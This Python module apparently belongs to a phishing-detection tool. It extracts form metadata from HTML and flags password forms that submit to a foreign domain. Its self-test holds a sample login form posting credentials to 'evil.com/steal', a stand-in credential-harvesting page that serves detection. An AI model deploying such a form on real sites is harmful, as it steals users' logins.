"""
evidence-engine/forms/form_extractor.py
Extracts detailed form metadata from rendered HTML.
Critically checks whether form action URLs match the page's own domain.
"""

from bs4 import BeautifulSoup
from urllib.parse import urlparse, urljoin
from typing import Any


def extract_forms(html: str, page_url: str) -> dict[str, Any]:
    """
    Extract form fingerprints from HTML.

    Args:
        html: Rendered HTML string.
        page_url: The URL of the page (to check action domain mismatches).

    Returns:
        dict with:
            - form_count: number of forms
            - forms: list of form detail dicts
            - has_password_field: whether any form has a password input
            - has_external_action: whether any form submits to a different domain
            - external_action_domains: list of external domains form data goes to
    """
    soup = BeautifulSoup(html, "lxml")
    page_domain = urlparse(page_url).hostname or ""

    forms_data = []
    has_password = False
    has_external_action = False
    external_domains = set()

    for form in soup.find_all("form"):
        # Form action
        raw_action = form.get("action", "")
        method = (form.get("method", "GET") or "GET").upper()

        # Resolve relative action URLs
        if raw_action:
            absolute_action = urljoin(page_url, raw_action)
            action_domain = urlparse(absolute_action).hostname or ""
        else:
            absolute_action = page_url
            action_domain = page_domain

        # Check domain mismatch
        action_is_external = (
            action_domain != ""
            and action_domain != page_domain
            and not action_domain.endswith(f".{page_domain}")
            and not page_domain.endswith(f".{action_domain}")
        )
        if action_is_external:
            has_external_action = True
            external_domains.add(action_domain)

        # Extract input fields (NEVER extract values — only metadata)
        inputs = []
        for inp in form.find_all("input"):
            input_type = (inp.get("type", "text") or "text").lower()
            input_name = inp.get("name", "")
            placeholder = inp.get("placeholder", "")

            if input_type == "password":
                has_password = True

            inputs.append({
                "type": input_type,
                "name": input_name,
                "placeholder": placeholder,
            })

        # Button labels
        buttons = []
        for btn in form.find_all(["button", "input"]):
            if btn.name == "button":
                label = btn.get_text(strip=True)
            elif btn.get("type") in ("submit", "button"):
                label = btn.get("value", "")
            else:
                continue
            if label:
                buttons.append(label)

        # Field type sequence (useful for pattern matching)
        field_type_sequence = [inp["type"] for inp in inputs
                               if inp["type"] not in ("hidden", "submit", "button")]

        forms_data.append({
            "action": raw_action,
            "absolute_action": absolute_action,
            "action_domain": action_domain,
            "action_is_external": action_is_external,
            "method": method,
            "inputs": inputs,
            "input_count": len(inputs),
            "field_type_sequence": field_type_sequence,
            "buttons": buttons,
            "has_password": any(i["type"] == "password" for i in inputs),
            "has_remember_me": any(
                "remember" in (i.get("name", "") + i.get("placeholder", "")).lower()
                for i in inputs
            ),
        })

    return {
        "form_count": len(forms_data),
        "forms": forms_data,
        "has_password_field": has_password,
        "has_external_action": has_external_action,
        "external_action_domains": list(external_domains),
    }


# ── Standalone test ───────────────────────────────────────────
if __name__ == "__main__":
    import json

    test_html = """
    <html><body>
        <form action="https://evil.com/steal" method="POST">
            <input type="text" name="username" placeholder="Email" />
            <input type="password" name="password" placeholder="Password" />
            <input type="checkbox" name="remember" />
            <button type="submit">Sign In</button>
        </form>
        <form action="/search" method="GET">
            <input type="text" name="q" placeholder="Search..." />
            <button type="submit">Go</button>
        </form>
    </body></html>
    """

    result = extract_forms(test_html, "https://example.com/login")
    print(json.dumps(result, indent=2))
    print(f"\n⚠ External action detected: {result['has_external_action']}")
    print(f"  External domains: {result['external_action_domains']}")
